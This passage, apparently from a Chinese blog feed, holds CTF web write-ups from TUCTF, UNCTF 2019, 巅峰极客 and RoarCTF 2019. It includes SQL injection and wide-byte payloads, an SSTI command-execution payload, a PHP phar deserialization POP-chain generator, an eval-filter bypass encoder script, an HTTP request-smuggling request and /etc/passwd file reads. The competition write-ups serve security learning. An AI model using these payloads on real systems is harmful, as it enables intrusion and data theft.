href="http://chal.tuctf.com:30001/login.hmtl时sql" target="_blank" rel="noopener">http://chal.tuctf.com:30001/login.hmtl时sql</a> 注入被过滤</p><p>对第一种情况sql注入得到</p><pre><code class="python">#database:information_schema,challenge,mysql,performance_schema,sys #table:users#columns:user,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS#user,password,USER : dave,hunter2,dave</code></pre><p>利用得到的账号密码直接在第二步登陆无效,猜测第二步还要sql注入</p><ul><li>sql注入</li></ul><pre><code class="python">dave&#39;+or+1%23 xdave&quot;+or+1%23 xdave&quot;)+or+1%23 xdave&#39;)+or+1%23 x\转义&#39;或&quot;来逃逸失败</code></pre><p>宽字节注入:</p><pre><code class="python">#username=%2bsleep(10)&amp;password=%bf%5c&quot; x#username=%2bsleep(10)&amp;password=%bf%5c&#39; x#username=%bf%5c&quot;&amp;password=%2bsleep(10) x#username=%bf%5c&#39;&amp;password=%2bsleep(10) x</code></pre><p>sql注入点时username还是password</p><p>是单引号还是双引号闭合</p><p>过滤了哪些字符，转义了哪些字符</p><p>We then looked at the challenge’s description again and realized that there might be backup of file somewhere. We then tried to get the <strong>login.php.bak</strong>.</p><p><img src="https://khroot.com/wp-content/uploads/2019/11/image-201.png" alt="img"></p><p>Surprise, there really is a backup file there. Let’s see what is inside.</p><p><img src="https://khroot.com/wp-content/uploads/2019/11/image-202-1024x385.png" alt="img"></p><p>We found the flag, and it is <code>TUCTF{b4ckup5_0f_php?_1t5_m0r3_c0mm0n_th4n_y0u_th1nk}</code></p><h3 id="The-Droid-You’re-Looking-For"><a href="#The-Droid-You’re-Looking-For" class="headerlink" title="The Droid You’re  Looking For"></a>The Droid You’re  Looking For</h3><p>看到droid想到robots.txt,直接访问提示没有权限</p><p>因为robots.txt是给爬虫看的,所以去百度了一个google爬虫的user-agent:</p><pre><code>Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1;</code></pre><p>robots.txt</p><pre><code>User-agent: *Disallow: googleagentflagfoundhere.html</code></pre><p>TUCTF{463nt_6006l3_r3p0rt1n6_4_r0b0t}</p><h3 id="And-Now-For-Something-Completely-Different"><a href="#And-Now-For-Something-Completely-Different" class="headerlink" title="And Now, For Something Completely Different"></a>And Now, For Something Completely Different</h3><pre><code class="python">Traceback (most recent call last):  File &quot;/usr/local/lib/python2.7/dist-packages/tornado/web.py&quot;, line 1509, in _execute    result = method(*self.path_args, **self.path_kwargs)  File &quot;/usr/src/app/class_website.py&quot;, line 87, in post    if len(name) == 0 or len(phone_num) == 0 or len(email) == 0 or len(passwd2) == 0 or passw != passw2:NameError: global name &#39;passwd2&#39; is not defined</code></pre><p>在网页中发现</p><pre><code class="html">&lt;!-- TODO: add /welcome/test --&gt;</code></pre><p>打开只有welcome test &lt;==&gt; /welcome/test</p><p>猜测是ssti</p><pre><code>{{__import__('os').popen('cat flag.txt').read()}}</code></pre><p> TUCTF{4lw4y5_60_5h0pp1n6_f0r_fl465} </p><h3 id="Cute-Animals-Company"><a href="#Cute-Animals-Company" class="headerlink" title="Cute Animals Company"></a>Cute Animals Company</h3><p>修改cookie获得登陆权限</p><p>sqlmap得到密码</p><p>file:///etc/passwd获得flag???</p><p>http访问都不行的呀</p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2019/11/30/tuctf/">https://www.ccreater.top/2019/11/30/tuctf/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unctf2019</title>
      <link href="2019/10/25/unctf2019/"/>
      <url>2019/10/25/unctf2019/</url>
      
        <content type="html"><![CDATA[<h1 id="unctf2019"><a href="#unctf2019" class="headerlink" title="unctf2019"></a>unctf2019</h1><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><pre><code class="php">&lt;?php    highlight_file(__FILE__);    $a = $_GET[&#39;a&#39;];    $b = $_GET[&#39;b&#39;]; // try bypass it    if (preg_match(&quot;/\&#39;|\&quot;|,|;|\`|\\|\*|\n|\t|\xA0|\r|\{|\}|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $a))        $a = &quot;&quot;;        $a =&#39;&quot;&#39; . $a . &#39;&quot;&#39;;    if (preg_match(&quot;/\&#39;|\&quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\{|\}|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $b))        $b = &quot;&quot;;        $b = &#39;&quot;&#39; . $b . &#39;&quot;&#39;;     $cmd = &quot;file $a $b&quot;;      str_replace(&quot; &quot;,&quot;&quot;,&quot;$cmd&quot;);      system($cmd);?&gt;</code></pre><p>用<code>a=\&amp;b=\</code>来逃脱引号</p><p>用?来匹配,但是隐藏文件是无法显示的要自己在前面加一个.</p><p><code>file &quot;\&quot; -f &quot;  \&quot;</code></p><p>最后在<code>http://101.71.29.5:10054/.F1jh_/h3R3_1S_your_F1A9.txt</code>里找到flag</p><p><code>unctf{86dfe85d7c5842c5c04adae104193ee1}</code></p><h2 id="NSB-RESET-PASSWORD"><a href="#NSB-RESET-PASSWORD" class="headerlink" title="NSB RESET PASSWORD"></a>NSB RESET PASSWORD</h2><p>题目说是重置密码,刚开始我想的是越权</p><p>后面搞了好久都不行。后面试着弄了一下发现一个验证码可以多次用.</p><p>我就猜有可能是条件竞争</p><p>先注册一个账号用收到的验证码重置，然后再用admin账号请求重置密码</p><p>然后直接跳到修改密码的界面,修改一下就出来了</p><p> flag{175f3098f80735ddfdfbd4588f6b1082} </p><h2 id="帮赵总征婚"><a href="#帮赵总征婚" class="headerlink" title="帮赵总征婚"></a>帮赵总征婚</h2><p>盲猜sql注入</p><p>转义:<code>&#39;,&quot;,\,#</code></p><p>还给了我们一个phpinfo?????</p><p>我也想帮赵总征婚啊，可是我没机会</p><p>remember_me 是否可以注入?</p><h2 id="inject-twice"><a href="#inject-twice" class="headerlink" title="inject twice"></a>inject twice</h2><p>题目是sql-lab的源码</p><p>二次注入点</p><pre><code class="php">if (isset($_POST[&#39;submit&#39;])){    # Validating the user input........    $username= $_SESSION[&quot;username&quot;];    $curr_pass= mysql_real_escape_string($_POST[&#39;current_password&#39;]);    $pass= mysql_real_escape_string($_POST[&#39;password&#39;]);    $re_pass= mysql_real_escape_string($_POST[&#39;re_password&#39;]);    if($pass==$re_pass)    {            $sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39; &quot;;        $res = mysql_query($sql) or die(&#39;You tried to be smart, Try harder!!!! :( &#39;);        $row = mysql_affected_rows();        echo &#39;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#39;;        echo &#39;&lt;center&gt;&#39;;        if($row==1)        {            echo &quot;Password successfully updated&quot;;        }        else        {            header(&#39;Location: failed.php&#39;);            //echo &#39;You tried to be smart, Try harder!!!! :( &#39;;        }    }    else    {        echo &#39;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&lt;center&gt;&#39;;        echo &quot;Make sure New Password and Retype Password fields have same value&quot;;        header(&#39;refresh:2, url=index.php&#39;);    }}?&gt;</code></pre><p>但是得到admin账号后,并没有得到flag,估计要把数据库给溜一圈。</p><p>黑名单:<code>or,</code></p><p>注册一个<code>hello\</code>的账号,就可以用,currentpass来注入,但是环境炸了,我sleep了一下就奇奇怪怪了</p><p>//////////////???????????????????</p><p>currentpass=<code>/**/or/**/1-- a</code></p><p>数据库名<code>or (SELECT substr(hex(group_concat(schema_name)),1,1) FROM information_schema.schemata)=char(54)-- a</code></p><p>information_schema,metinfo,mysql,performance_schema,security,sys</p><p>表:</p><p><code>GROUP_CONCAT(table_name) FROM information_schema.tables WHERE TABLE_SCHEMA=database()</code></p><p>security:emails,fl4g,referers,uagents,users</p><p>列名</p><p>fl4g:f1ag</p><p>最后的flag<code>UNCTF{585ae8df50433972bb6ebd76e3ebd9f4}</code></p><h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>又是一个vue应用</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8cz6r1f4pj30ep0d2wfe.jpg" alt="image.png"></p><p>在代码中发现</p><p>/calc: 可以命令执行,但是却没有办法找到有效的利用方式</p><p>后端是node.js</p><p>version: v10.12.0 </p><p>cwd:/usr</p><p>/usr目录</p><p> bin,games,include,lib,local,sbin,share,src </p><p>res.end(require(‘fs’).readFileSync(‘/etc/passwd’).toString())</p><p>require(‘fs’).readdirSync.(‘/etc/passwd’).toString()</p><p>在根目录下找到flag</p><p>  flag{0e4d1980ef6f8a81428f83e8e1c6e22b} </p><p>最后还是晚了一分钟</p><p>看来改天要看看nodejs的东东?</p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2019/10/25/unctf2019/">https://www.ccreater.top/2019/10/25/unctf2019/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>巅峰极客</title>
      <link href="2019/10/19/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/"/>
      <url>2019/10/19/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="巅峰极客"><a href="#巅峰极客" class="headerlink" title="巅峰极客"></a>巅峰极客</h1><h2 id="aweb-1"><a href="#aweb-1" class="headerlink" title="aweb_1"></a>aweb_1</h2><p><a href="mailto:abcdefghij1@qq.com">abcdefghij1@qq.com</a></p><p>黑名单:union</p><p><code>fuckyoufuck&#39;/**/or/**/1^&#39;0</code></p><p>最后payload:<code>admin&#39;/*ffuuucckyou*/or/**/&#39;</code></p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>已知文件:<code>file.php,download.php,index.php,upload_file.php</code></p><p>download.php</p><pre><code class="php">$name = $_GET[&#39;name&#39;];$url = $_SERVER[&#39;QUERY_STRING&#39;];if (isset($name)){    if (preg_match(&#39;/\.|etc|var|tmp|usr/i&#39;, $url)){        echo(&quot;hacker!&quot;);    }    else{        if (preg_match(&#39;/base|class|file|function|index|upload_file/i&#39;, $name)){            echo (&quot;hacker!&quot;);        }        else{            $name = safe_replace($name);            if (preg_match(&#39;/base|class|file|function|index|upload_file/i&#39;, $name)){                $filename = $name.&#39;.php&#39;;                $dir =&quot;./&quot;;                $down_host = $_SERVER[&#39;HTTP_HOST&#39;].&#39;/&#39;;                if(file_exists(__DIR__.&#39;/&#39;.$dir.$filename)){                    $file = fopen ( $dir.$filename, &quot;rb&quot; );                    Header ( &quot;Content-type: application/octet-stream&quot; );                    Header ( &quot;Accept-Ranges: bytes&quot; );                    Header ( &quot;Accept-Length: &quot; . filesize ( $dir.$filename ) );                    Header ( &quot;Content-Disposition: attachment; filename=&quot; . $filename );                    echo fread ( $file, filesize ( $dir . $filename ) );                    fclose ( $file );                    exit ();                }else{                    echo (&quot;file doesn&#39;t exist.&quot;);                }            }            if (preg_match(&#39;/flag/i&#39;, $name)){                echo (&quot;hacker!&quot;);            }        }    }}</code></pre><p>file.php</p><pre><code class="php">&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;);  include &#39;function.php&#39;; include &#39;class.php&#39;;$file = $_GET[&quot;file&quot;] ? $_GET[&#39;file&#39;] : &quot;&quot;; if(empty($file)) {     echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; }if(preg_match(&#39;/http|https|file:|gopher|dict|\.\/|\.\.|flag/i&#39;,$file)) {            die(&#39;hacker!&#39;); }elseif(!preg_match(&#39;/\//i&#39;,$file)){    die(&#39;hacker!&#39;);}$show = new Show(); if(file_exists($file)) {     $show-&gt;source = $file;     $show-&gt;_show(); } else if (!empty($file)){     die(&#39;file doesn\&#39;t exists.&#39;); } ?&gt;</code></pre><p>function.php</p><pre><code class="php">&lt;?php//show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text/html;charset=utf-8&quot;); error_reporting(0); function upload_file_do() {     global $_FILES;     $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;]).&quot;.jpg&quot;;     //mkdir(&quot;upload&quot;,0777);     if(file_exists(&quot;upload/&quot; . $filename)) {         unlink($filename);     }     move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename);     echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#39;; } function upload_file() {     global $_FILES;     if(upload_file_check()) {         upload_file_do();     } } function upload_file_check() {     global $_FILES;     $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;);     $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]);     $extension = end($temp);     if(empty($extension)) {         //echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;;     }     else{         if(in_array($extension,$allowed_types)) {             return true;         }         else {             echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#39;;             return false;         }     } } ?&gt; </code></pre><p>class.php</p><pre><code class="php">&lt;?phpclass Show{    public $source;    public $str;    public function __construct($file)    {        $text= $this-&gt;source;        $text = base64_encode(file_get_contents($text));        return $text;    }    public function __toString()    {        $text= $this-&gt;source;        $text = base64_encode(file_get_contents($text));        return $text;    }    public function __set($key,$value)    {        $this-&gt;$key = $value;    }    public function _show()    {        if(preg_match(&#39;/http|https|file:|gopher|dict|\.\.|flag/i&#39;,$this-&gt;source)) {            die(&#39;hacker!&#39;);        } else {            highlight_file($this-&gt;source);        }    }    public function __wakeup()    {        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) {            echo &quot;hacker~&quot;;            $this-&gt;source = &quot;index.php&quot;;        }    }}class S6ow{    public $file;    public $params;    public function __construct()    {        $this-&gt;params = array();    }    public function __get($key)    {        return $this-&gt;params[$key];    }    public function __call($name, $arguments)    {        if($this-&gt;{$name})            $this-&gt;{$this-&gt;{$name}}($arguments);    }    public function file_get($value)    {        echo $this-&gt;file;    }}class Sh0w{    public $test;    public $str;    public function __construct($name)    {        $this-&gt;str = new Show(&#39;index.php&#39;);        $this-&gt;str-&gt;source = $this-&gt;test;    }    public function __destruct()    {        $this-&gt;str-&gt;_show();    }}?&gt;</code></pre><p>分析发现一堆类，且file_exists可以触发phar反序列化漏洞</p><p>pop链:</p><p><code>sh0w($str=new S6ow)-&gt;S6ow($file=new Show,$_show=&quot;file_get&quot;)-&gt;Show($source=&#39;/flag&#39;)</code></p><pre><code class="php">&lt;?phpclass Show{    public $source;    public $str;    public function __construct()    {        $this-&gt;source=&quot;/flag&quot;;        $this-&gt;str=&quot;&quot;;        $text= $this-&gt;source;    }    public function __toString()    {        $text= $this-&gt;source;    }}class S6ow{    public $file;    public $params;    public $_show;    public function __construct()    {        $this-&gt;params = array();        $this-&gt;file=new Show;        $this-&gt;_show=&quot;file_get&quot;;    }    public function __get($key)    {        return $this-&gt;params[$key];    }    public function __call($name, $arguments)    {        $name=&quot;_show&quot;;        print($name);        print($this-&gt;{$name});        if($this-&gt;{$name})            $this-&gt;{$this-&gt;{$name}}($arguments);            //$this-&gt;file_get($arguments);            //$this-&gt;{$name}=&quot;file_get&quot;            //$name=_show            //$file=new Show;    }    public function file_get($value)    {    }}class Sh0w{    public $test;    public $str;    public function __construct()    {        $this-&gt;str =new S6ow;        $this-&gt;test=&quot;&quot;;    }    public function __destruct()    {        $this-&gt;str-&gt;_show();    }}$a=new Sh0w();@unlink(&quot;hello.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar,phar伪协议不用phar后缀$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub,只要后面部分为__HALT_COMPILER(); $phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt;</code></pre><p>flag{a592b240-32ae-4381-a0ab-83790c98ca28}</p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2019/10/19/巅峰极客/">https://www.ccreater.top/2019/10/19/巅峰极客/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>roarctf2019</title>
      <link href="2019/10/15/roarctf2019/"/>
      <url>2019/10/15/roarctf2019/</url>
      
        <content type="html"><![CDATA[<h1 id="roarctf2019"><a href="#roarctf2019" class="headerlink" title="roarctf2019"></a>roarctf2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="easycalc"><a href="#easycalc" class="headerlink" title="easycalc"></a>easycalc</h3><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><pre><code class="php">&lt;?phperror_reporting(0);if(!isset($_GET[&#39;num&#39;])){    show_source(__FILE__);}else{        $str = $_GET[&#39;num&#39;];        $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];        foreach ($blacklist as $blackitem) {                if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $str)) {                        die(&quot;what are you want to do?&quot;);                }        }        eval(&#39;echo &#39;.$str.&#39;;&#39;);}?&gt;</code></pre><h4 id="解法一-肝就完事"><a href="#解法一-肝就完事" class="headerlink" title="解法一 肝就完事"></a>解法一 肝就完事</h4><p>强行绕过限制</p><p>关键:<code>((10000000000000).(0)){3}</code>=&gt;E</p><p>python脚本</p><pre><code class="python">arr={    &quot;0&quot;:&#39;&#39;&#39;((0).(0)){0}&#39;&#39;&#39;,    &quot;1&quot;:&#39;&#39;&#39;((1).(0)){0}&#39;&#39;&#39;,    &quot;2&quot;:&#39;&#39;&#39;((2).(0)){0}&#39;&#39;&#39;,    &quot;3&quot;:&#39;&#39;&#39;((3).(0)){0}&#39;&#39;&#39;,    &quot;4&quot;:&#39;&#39;&#39;((4).(0)){0}&#39;&#39;&#39;,    &quot;5&quot;:&#39;&#39;&#39;((5).(0)){0}&#39;&#39;&#39;,    &quot;6&quot;:&#39;&#39;&#39;((6).(0)){0}&#39;&#39;&#39;,    &quot;7&quot;:&#39;&#39;&#39;((7).(0)){0}&#39;&#39;&#39;,    &quot;8&quot;:&#39;&#39;&#39;((8).(0)){0}&#39;&#39;&#39;,    &quot;9&quot;:&#39;&#39;&#39;((9).(0)){0}&#39;&#39;&#39;,    &quot;-&quot;: &quot;((-1).(0)){0}&quot;,    &quot;.&quot; :&quot;((1.1).(0)){1}&quot;,    &quot;E&quot;: &quot;((10000000000000000000).(1)){3}&quot;,    &quot;p&quot;:&quot;((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1}))&quot;,    &quot;$&quot;:&quot;((((-1).(0)){0})&amp;(((4).(0)){0}))&quot;,    &quot;l&quot;:&quot;((((-1).(0)){0})&amp;(((4).(0)){0}))|(~((0).(0)){0})&amp;~((~((8).(0)){0})&amp;(~((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1}))))&quot;,    &quot;H&quot;: &quot;(~((0).(0)){0})&amp;~((~((8).(0)){0})&amp;(~((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1}))))&quot;,    &quot;Z&quot; : &quot;(~(((((-1).(0)){0})&amp;(((4).(0)){0}))))&amp;(~((~(((8).(0)){0}))&amp;((~(((2).(0)){0}))&amp;(~(((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1})))))))&quot;,    &quot;v&quot; :&quot;(((2).(0)){0})|((~((1).(0)){0})&amp;((10000000000000000000).(1)){3})&quot;,    &quot;D&quot; :&quot;(~((1).(0)){0})&amp;((10000000000000000000).(1)){3}&quot;,    &quot;A&quot; :&quot;(~((2).(0)){0})&amp;(~((~((1).(0)){0})&amp;(~((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1})))))&quot;,    &quot;P&quot; :&quot;(~((1.1).(0)){1})&amp;((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1}))&quot;,    &quot;O&quot; :&quot;(~((0).(0)){0})&amp;(~((~((8).(0)){0})&amp;((~((2).(0)){0})&amp;(~((10000000000000000000).(1)){3}))))&quot;,    &quot;S&quot; :&quot;(~((((-1).(0)){0})&amp;(((4).(0)){0})))&amp;(~((~((2).(0)){0})&amp;(~((10000000000000000000).(1)){3})))&quot;,    &quot;U&quot; :&quot;(((10000000000000000000).(1)){3})|((~((((-1).(0)){0})&amp;(((4).(0)){0})))&amp;(~((~((1).(0)){0})&amp;(~((1.1).(0)){2}))))&quot;,    &quot;_&quot; :&quot;((10000000000000000000).(1)){3}|(((~((((-1).(0)){0})&amp;(((4).(0)){0})))&amp;(~((~((1).(0)){0})&amp;(~((1.1).(0)){1})))))&quot;,    &quot;T&quot; :&quot;(~(((1).(0)){0}&amp;(~((2).(0)){0})))&amp;(~((~((10000000000000000000).(1)){3})&amp;(~(((1).(0)){0}&amp;(~((1.1).(0)){1})))))&quot;,    &quot;I&quot; :&quot;(~(((0).(0)){0}))&amp;(~((~((8).(0)){0})&amp;((~((1).(0)){0})&amp;(~((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1}))))))&quot;,    &quot;N&quot; :&quot;(~((0).(0)){0})&amp;(~((~((8).(0)){0})&amp;((~(((2).(0)){0}))&amp;(~((~((1).(0)){0})&amp;((10000000000000000000).(1)){3})))))&quot;,    &quot;f&quot; :&quot;((((-1).(0)){0})&amp;(((4).(0)){0}))|((~(((4).(0)){0}))&amp;(~((~(((2).(0)){0}))&amp;(~((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1}))))))&quot;,    &quot;B&quot; :&quot;(~(((4).(0)){0}))&amp;(~((~(((2).(0)){0}))&amp;(~((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1})))))&quot;,    &quot;r&quot; :&quot;(~((~(((2).(0)){0}))&amp;(~((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1})))))&quot;,    &quot;[&quot; :&quot;(~(((((-1).(0)){0})&amp;(((4).(0)){0}))))&amp;(~((~((8).(0)){0})&amp;((~(((2).(0)){0}))&amp;(~(((10000000000000000000).(1)){3})))))&quot;,    &quot;]&quot; :&quot;(((10000000000000000000).(1)){3})|((((8).(0)){0})&amp;(~(((((-1).(0)){0})&amp;(((4).(0)){0})))))&quot;,    &quot;C&quot;:&quot;(~(((4).(0)){0}))&amp;(~((~(((2).(0)){0}))&amp;(~(((10000000000000000000).(1)){3}))))&quot;,    &quot;M&quot;:&quot;(~(((0).(0)){0}))&amp;(~((~(((8).(0)){0}))&amp;(~(((10000000000000000000).(1)){3}))))&quot;,    &quot;\\&quot;:&quot;(~(((((1).(0)){0}))&amp;(~(((2).(0)){0})))&amp;~((~(((10000000000000000000).(1)){3}))&amp;~((((8).(0)){0})&amp;(~(((((-1).(0)){0})&amp;(((4).(0)){0})))))))&quot;,    &quot;/&quot;:&quot;((((1.1).(0)){1})|(((-1).(0)){0}))&quot;,    &quot;G&quot;:&quot;(~(((8).(0)){0}))&amp;(~((~(((2).(0)){0}))&amp;(~(((10000000000000000000).(1)){3}))))&quot;,    &quot;g&quot;:&quot;(((10000000000000000000).(1)){3})|((((2).(0)){0})&amp;(((1.1).(0)){1}))&quot;,    &quot;a&quot;:&quot;((((1).(0)){0})&amp;((~((2).(0)){0})))|((((((10000000000000000000).(1)){3})&amp;(~(((1).(7)){1})|(((1).(0)){1}))|(((1).(0)){1})))&amp;(~((((1).(0)){0})&amp;(~(((1.1).(0)){1})))))&quot;    }s=&quot;scandir&quot;def topayload(s):    result=&quot;&quot;    for i in s:        if(i in arr):            result+=(&quot;(&quot;+arr[i]+&quot;)&quot;+&quot;.&quot;)            continue        if(i.upper() in arr):            result+=(&quot;(&quot;+arr[i.upper()]+&quot;)&quot;+&quot;.&quot;)            continue        if(i.lower() in arr):            result+=(&quot;(&quot;+arr[i.lower()]+&quot;)&quot;+&quot;.&quot;)    return result[:-1]def tomethod(meth,para,c=True):    if c:        return &quot;(&quot;+topayload(meth)+&quot;)(&quot;+topayload(para)+&quot;)&quot;    else :        return &quot;(&quot;+topayload(meth)+&quot;)(&quot;+(para)+&quot;)&quot;# print(tomethod(&quot;var_dump&quot;,tomethod(&quot;scandir&quot;,&quot;/&quot;),False))print(tomethod(&quot;var_dump&quot;,tomethod(&quot;file&quot;,&quot;/f1agg&quot;),False))# print(tomethod(&quot;file_get_contents&quot;,&quot;/f1agg&quot;))</code></pre><h4 id="解法二-HTTP走私"><a href="#解法二-HTTP走私" class="headerlink" title="解法二 HTTP走私"></a>解法二 HTTP走私</h4><p>http走私请看:<a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">https://paper.seebug.org/1048/</a></p><p>这题php禁用了<code>$blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;反引号&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];</code></p><p>apache再禁用了字母和不可打印字符</p><p>后来看别人的wp知道了,虽然服务器返回400,但是还会将请求转发给后端,标准的http走私</p><p><img src="https://i.loli.net/2019/10/18/9YgzckxODPiNe6C.png" alt="image.png"></p><p>真几把神奇，刚看到http走私的时候我还以为是前后端对content-type的解析不同</p><p>结合getallheads来绕过php字符限制</p><p>最后payload:</p><pre><code>POST /calc.php?num=eval(end(getallheaders())); HTTP/1.1Host: node3.buuoj.cn:28023Accept: */*X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36Referer: http://node3.buuoj.cn:28023/Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 422Content-Length: 0A: var_dump(file_get_contents(&quot;/f1agg&quot;));</code></pre><h4 id="解法三-利用php字符串解析特性绕过apache-waf"><a href="#解法三-利用php字符串解析特性绕过apache-waf" class="headerlink" title="解法三 利用php字符串解析特性绕过apache waf"></a>解法三 利用php字符串解析特性绕过apache waf</h4><p>php字符串解析特性</p><p><img src="https://image.3001.net/images/20190904/1567560438_5d6f12f680afe.png!small" alt=""></p><p><img src="https://image.3001.net/images/20190904/1567560448_5d6f13004035f.png!small" alt=""></p><p>当我们发送这样一个请求是:<code>?%20num=123</code></p><p>apache的检查规则只能匹配到num,而这个请求在php却会被解析为$_GET[‘num’]最后成功绕过apache的waf</p><h3 id="Easy-Java"><a href="#Easy-Java" class="headerlink" title="Easy Java"></a>Easy Java</h3><p>扫目录发现一个Download,去登入界面查找一下download,发现<code>Download?filename=help.docx</code></p><p>可是无论下什么也不行,看了别人的wp发现post就可以233333</p><p>接下来就简单了,因为这是一个tomcat的网站</p><p>贴一个tomcat的结构图</p><p><img src="https://i.loli.net/2019/09/01/LduWtSfIh8bDA7Z.png" alt=""></p><p>先去查看一下WEB-INF/web.xml</p><p>发现</p><pre><code class="xml">    &lt;servlet&gt;        &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;        &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;    &lt;/servlet&gt;</code></pre><p>于是去WEB-INF/classes/com/wm/ctf/FlagController.class</p><p>查看,发现一个base64编码的字符串</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g82oi6jxybj31240l2dj8.jpg" alt="image.png"></p><h3 id="simple-upload"><a href="#simple-upload" class="headerlink" title="simple_upload"></a>simple_upload</h3><h4 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h4><pre><code class="php">&lt;?phpnamespace Home\Controller;use Think\Controller;class IndexController extends Controller{    public function index()    {        show_source(__FILE__);    }    public function upload()    {        $uploadFile = $_FILES[&#39;file&#39;] ;        